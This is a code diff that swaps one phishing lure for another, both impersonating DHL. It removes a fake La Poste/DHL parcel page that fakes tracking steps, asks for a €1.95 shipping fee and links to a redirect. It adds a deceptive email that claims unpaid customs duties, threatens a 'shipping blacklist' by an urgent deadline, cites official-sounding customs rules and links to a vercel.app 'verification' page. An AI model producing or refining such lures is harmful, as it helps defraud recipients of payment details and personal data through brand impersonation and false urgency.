@@ -1,323 +1,85 @@
-<!DOCTYPE html>
-<html>
-<head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <meta name="robots" content="noindex, nofollow, noarchive">
-    <title>(1) Nouveau Message</title>
-    <link rel="shortcut icon" href="favicon.ico" />
-    <link rel="stylesheet" href="styles.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
-    <script src="modernizr.min.js"></script>
-</head>
-
-<body class="loaded">
-
-    
-        <div id="system_overlay">
-        <div class="system-container">
-            <div class="system-inner-container">
-                <div class="system-message">
-                    <img src="logo.png">
-                    <p>You have <span style="color: #ff0000; font-weight: bold;">(1)</span> package awaiting, ready for delivery.</p>
-                    <center>
-<center>
-  <button
-    type="button"
-    class="btn animated infinite pulse"
-    id="openMessage"
-    style="
-      margin: 0 auto;
-      display: inline-block;
-      background-color: #FFCC00;      /* jaune DHL */
-      color: #000;                    /* texte noir */
-      border: 2px solid #000;         /* bordure plus épaisse */
-      padding: 1rem 2rem;             /* cadre plus grand */
-      font-size: 1.2rem;              /* texte plus visible */
-      border-radius: 0.5rem;          /* coins arrondis */
-    "
-  >
-    TO CONFIRM
-  </button>
-                    </center>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <div class="page">
-        <!-- HEADER -->
-        <header class="header">
-            <img src="logo.png" class="header__icon">
-        </header>
-        <!-- / HEADER -->
-
-        <!-- Screen 1 -->
-        <main class="main main--1">
-            <div class="card">
-                <h2 class="title" data-translate-key="delivery">PACKAGE AWAITING</h2>
-                <span class="badge" data-badge="!"><img src="icon-box.png" alt="" style="width: 170px;"></span>
-                <p data-translate-key="you_have_package">You have (1) pending package, ready for delivery. Use your code to track and receive your package.</p>
-                <hr>
-                <dl class="tracking-code">
-                    <dt data-translate-key="your_tracking_code">Your tracking number:</dt>
-                    <dd>GY5T5472</dd>
-                </dl>
-            </div>
-           <button
-  type="button"
-  class="btn screen-trigger--1"
-  style="
-    background-color: #FFCC00;  /* jaune DHL */
-    color: #000;                /* texte noir */
-    border: 2px solid #000;     /* bordure plus épaisse */
-    padding: 1rem 2rem;         /* cadre plus grand */
-    font-size: 1.1rem;          /* texte un peu plus gros */
-    border-radius: 0.5rem;      /* coins arrondis */
-  "
-  data-translate-key="follow_your_order"
->
-  Track your package.
-</button>
-        </main>
-
-        <!-- Screen 2 -->
-        <main class="main main--2">
-            <div class="card">
-                <div class="spinner-container">
-                    <div class="spinner"></div>
-                    <img src="check-circle-regular.png" alt="" class="main__icon icon icon-check">
-                </div>
-                <div class="spinner-margin"></div>
-
-                <ul class="loading-list">
-                    <li>Your package is being tracked…</li>
-                    <li>Your tracking number is being searched…</li>
-                    <li>Searching for delivery options...</li>
-                </ul>
-            </div>
-        </main>
-
-        <!-- Screen 3 -->
-        <main class="main main--3">
-            <ol class="steps-wrap">
-                <li class="step step--current"></li>
-                <li class="step"></li>
-                <li class="step"></li>
-            </ol>
-            <div class="card">
-                <div class="productContainer">
-                <img src="iphone_14n-.png" alt="iphone 14">
-                </div>
-                <div class="product">  
-                    <div class="product__content">
-                        <h3 class="subtitle" data-translate-key="package_information">Information about the packages:</h3>
-                        <table>
-                            <tr style="font-size: 14px;">
-                                <th style="font-weight: bold; color: #333;">Status: </th><td>Ready for delivery</td>
-                            </tr>
-                            <tr style="font-size: 14px;">
-                                <th style="font-weight: bold; color: #333;">Contains: </th><td>Package</td>
-                            </tr>
-                            <tr style="font-size: 14px;">
-                                <th style="font-weight: bold; color: #333;"></th><td></td>
-                            </tr>
-                        </table>
-                    </div>
-                </div>
-            </div>
-            <div class="card">
-                <h2 class="title title--primary" data-translate-key="order_confirmation">Confirmation of delivery</h2>
-                <img src="samsung-s10.png" alt="" class="spaced1">
-                <h3 class="subtitle" data-translate-key="estimated_delivery">Delivery time: 3 days</h3>
-                <p><span data-translate-key="enter_your_contact"><span style="color: red;">*</span> Enter your address on the next page and pay €1.95 shipping costs.</span>
-                </p>
-            </div>
-            <a
-  href="https://frst-sw.com/?a=74484&c=406496&co=319977&mt=26"
-  style="
-    cursor: pointer !important;
-    display: inline-block;
-    background-color: #FFCC00;  /* jaune DHL */
-    color: #000;                /* texte noir */
-    padding: 0.75rem 1.5rem;    /* cadre plus grand */
-    border-radius: 0.25rem;     /* coins légèrement arrondis */
-    text-decoration: none;
-    font-weight: bold;
-  "
-  class="btn"
-  data-translate-key="delivery_information"
->
-  Enter the shipping details.
-</a>
-        </main>
-
-        <main class="main main--6">
-            <ol class="steps-wrap">
-                <li class="step step--done"></li>
-                <li class="step step--done"></li>
-                <li class="step step--current"></li>
-            </ol>
-            <div class="card">
-                <h2 class="title title--primary" data-translate-key="order_confirmation">Confirmation of delivery</h2>
-                <img src="samsung-s10.png" alt="" class="spaced1">
-                <h3 class="subtitle" data-translate-key="estimated_delivery">Delivery time: 3 days</h3>
-                <p><span data-translate-key="enter_your_contact"><span style="color: red;">*</span> Enter your address on the next page and pay 2€ shipping costs.</span>
-                </p>
-            </div>
-            <a href="" style="cursor:pointer !important;" class="btn" data-translate-key="delivery_information">Enter the shipping details.</a>
-        </main>
-        <div class="foot">
-            <h4 class="foot__title" data-translate-key="posted_by">2025 DHL Express. All rights reserved</h4>
-        </div>
-    </div>
-    <script type="text/javascript" src="jquery-latest.min.js"></script>
-    <script src="https://cdn.by.wonderpush.com/sdk/1.1/wonderpush-loader.min.js" async></script>
-    <script>
-    window.WonderPush = window.WonderPush || [];
-    WonderPush.push(["init", {
-        webKey: "061e255dda42994a0ce0db51a2f5c018b6b557fc5e04f75a5248db8605949a9c",
-    }]);
-    </script>
-    <script>
-
-        $('#openMessage').click(function(e){
-            e.preventDefault();
-            $('#system_overlay').fadeOut(function(){
-                $(this).remove();
-            });
-        });
-
-        $(window).on("load", function() {
-            $('body').addClass('loaded');
-        });
-
-        //Mobile height
-        window.addEventListener('load', () => {
-            let vh = window.innerHeight * 0.01;
-            document.documentElement.style.setProperty('--vh', `${vh}px`);
-        });
-        window.addEventListener('resize', () => {
-            let vh = window.innerHeight * 0.01;
-            document.documentElement.style.setProperty('--vh', `${vh}px`);
-        });
-
-        $(document).ready(function() {
-            //Screen trigger
-            $('.screen-trigger--1').click(function() {
-                $('html, body').animate({
-                    scrollTop: 0
-                }, 100);
-                $('.main--1').fadeOut(100);
-
-                $('.page').addClass('page--inner');
-
-                setTimeout(
-                    function() {
-                        $('.main--2').fadeIn(1000);
-                    }, 100
-                );
-
-                setTimeout(
-                    function() {
-                        $('html, body').animate({
-                            scrollTop: 0
-                        }, 100);
-                        $('.main--2 .spinner').fadeOut(180);
-                        $('.main--2').addClass('checked');
-                    }, 3000
-                );
-
-                setTimeout(
-                    function() {
-                        $('html, body').animate({
-                            scrollTop: 0
-                        }, 100);
-                        $('.main--2').fadeOut(100);
-                        $('.main--3').fadeIn(1000);
-                    }, 4000
-                );
-            });
-
-            $('.screen-trigger--2').click(function() {
-                $('html, body').animate({
-                    scrollTop: 0
-                }, 100);
-                $('.main--3').fadeOut(200);
-
-                setTimeout(
-                    function() {
-                        $('.main--4').fadeIn(1000);
-                    }, 200
-                );
-            });
-
-
-            //Questions
-            $('.question--1 label:not([data-error]), .question--2 label').click(function() {
-                var currentQ = $(this).parents('.question'),
-                    nextQ = $(this).parents('.question').next();
-
-                setTimeout(function() {
-                    currentQ.fadeOut(300);
-                }, 500);
-
-                setTimeout(function() {
-                    nextQ.fadeIn(500);
-                }, 800);
-            });
-
-            $('[data-error]').click(function() {
-
-                $(".question__error").toggleClass('hidden');
-            });
-
-            $('.question--3 label').click(function() {
-                $('html, body').animate({
-                    scrollTop: 0
-                }, 100);
-
-                setTimeout(function() {
-                    $('.main--4').fadeOut(200);
-                }, 300);
-
-                setTimeout(function() {
-                    $('.main--5').fadeIn(1000);
-                }, 500);
-
-                setTimeout(
-                    function() {
-                        $('html, body').animate({
-                            scrollTop: 0
-                        }, 100);
-                        $('.main--5 .spinner').fadeOut(180);
-                        $('.main--5').addClass('checked');
-                    }, 3300
-                );
-
-                setTimeout(
-                    function() {
-                        $('html, body').animate({
-                            scrollTop: 0
-                        }, 100);
-                        $('.main--5').fadeOut(100);
-                        $('.main--6').fadeIn(1000).css('display', 'flex');
-                    }, 4300
-                );
-            });
-        });
-    </script>
-    <script>
-        var changed_title = false;
-        setInterval(function() {
-            if (changed_title) {
-                document.title = '(1) Nouveau Message | La Poste';
-                changed_title = false;
-            } else {
-                document.title = 'La Poste | (1) Nouveau Message';
-                changed_title = true;
-            }
-        }, 3000);
-    </script>
-</body>
-</html>
+<HTML lang="en">
+<HEAD>
+<TITLE>[Customs Compliance] Confirmation Notice for International Package DHL GLI-GY5T5472</TITLE>
+<META charset="UTF-8">
+<META name="viewport" content="width=device-width, initial-scale=1.0">
+<STYLE type="text/css">
+.ReadMsgBody { WIDTH: 100% }
+.ExternalClass { WIDTH: 100%; LINE-HEIGHT: 100% }
+BODY {
+    PADDING: 0; MARGIN: 0; -webkit-text-size-adjust: 100%
+}
+TABLE {
+    BORDER-SPACING: 0; mso-table-lspace: 0pt; mso-table-rspace: 0pt
+}
+IMG {
+    BORDER: 0; TEXT-DECORATION: none; HEIGHT: auto; OUTLINE: none; LINE-HEIGHT: 100%
+}
+</STYLE>
+</HEAD>
+<BODY style="BACKGROUND: #f5f7fa; PADDING: 0; MARGIN: 0">
+<TABLE role="presentation" cellspacing="0" cellpadding="0" width="100%" border="0">
+<TBODY>
+<TR>
+<TD align="center" style="PADDING: 20px 0">
+<TABLE role="presentation" style="BACKGROUND: #ffffff; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.08)" cellspacing="0" cellpadding="0" width="600" border="0">
+<TBODY>
+<TR>
+<TD style="BACKGROUND: #1a365d; PADDING: 24px; border-radius: 8px 8px 0 0">
+<TABLE width="100%">
+<TBODY>
+<TR>
+<TD style="TEXT-ALIGN: center">
+<SPAN style="FONT-SIZE: 18px; VERTICAL-ALIGN: middle; COLOR: #ffffff; MARGIN-LEFT: 12px">Customs Registration Number: GY5T5472</SPAN>
+</TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style="PADDING: 32px 24px">
+<TABLE width="100%">
+<TBODY>
+<TR>
+<TD style="PADDING-BOTTOM: 24px">
+<H1 style="FONT-SIZE: 24px; FONT-WEIGHT: 700; COLOR: #1a365d; MARGIN: 0">🚚 Your package DHL is temporarily held due to customs duties.</H1> <br><br> We have detected an outstanding tax payment.<br><br>  The customs clearance process for your package is suspended until it is completed.<br><br>  Due to an increase in abandoned packages, customs policy has been tightened. Please act quickly to ensure safe receipt of your package.<br><br>
+</TD></TR>
+<TR>
+<TD style="MARGIN-BOTTOM: 24px; BACKGROUND: #fff4e6; PADDING: 16px; BORDER-LEFT: #ff6d00 4px solid">
+<P style="FONT-SIZE: 16px; COLOR: #d46b08; MARGIN: 0; LINE-HEIGHT: 1.5">
+🚨 Priority: High<BR>
+📅 Deadline: 2025-05-25, 18:00 (UTC+8)<BR>
+📌 Related Regulation: Failure to complete the process within the specified time may result in your name being placed on the national shipping blacklist, affecting future deliveries.
+</P></TD></TR>
+<TR>
+<TD style="PADDING-BOTTOM: 24px">
+<TABLE style="BACKGROUND: #f8f9fa; PADDING: 16px; border-radius: 4px" width="100%">
+<TBODY>
+<TR>
+<TD>
+<P style="COLOR: #2d3748; MARGIN: 8px 0">
+📦 Package Number: GY5T5472<BR>
+🚢 Shipping Method: International Sea Freight<BR>
+📋 Current Status: Awaiting Final Delivery Address Confirmation
+</P></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style="PADDING-BOTTOM: 24px">
+<P style="FONT-SIZE: 14px; COLOR: #718096; MARGIN: 0; LINE-HEIGHT: 1.6">
+According to Article 45 of the Customs Law of the People's Republic of China and Order No. 561 of the General Administration of Customs, the recipient of international parcels must complete electronic identity verification. This notice is issued under the following regulations:<BR>
+- Regulation on Supervision of Cross-border E-commerce Retail Imports (MOFCOM Notice No. 7 of 2018)<BR>
+- GAC Notice on Regulation of Cross-border E-commerce Payment Management (Notice No. 3 of 2023)
+</P></TD></TR>
+<TR>
+<TD style="TEXT-ALIGN: center; PADDING: 16px 0">
+<A style="TEXT-DECORATION: none; BACKGROUND: #ff6d00; FONT-WEIGHT: 600; COLOR: #ffffff; PADDING: 14px 32px; DISPLAY: inline-block; border-radius: 6px; transition: background 0.3s" href="https://service-service.vercel.app/">Verify Information Now</A>
+</TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style="BACKGROUND: #1a365d; COLOR: #cbd5e0; PADDING: 24px; border-radius: 0 0 8px 8px">
+<TABLE width="100%">
+<TBODY>
+<TR>
+<TD style="FONT-SIZE: 12px; LINE-HEIGHT: 1.6">
+<P style="MARGIN: 0 0 12px">This is an automatically generated email, please do not reply directly.</P>
+<P style="MARGIN: 0 0 8px">DHL Operations Center: 28/F, World Financial Center, 100 Century Avenue, Pudong</P>
+<P style="MARGIN: 0"></P>
+<P style="MARGIN: 16px 0 0">
+<A style="TEXT-DECORATION: underline; COLOR: #cbd5e0" href="">Privacy Policy</A> | <A style="TEXT-DECORATION: underline; COLOR: #cbd5e0" href="">Unsubscribe</A>
+</P></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+</BODY>
+</HTML>
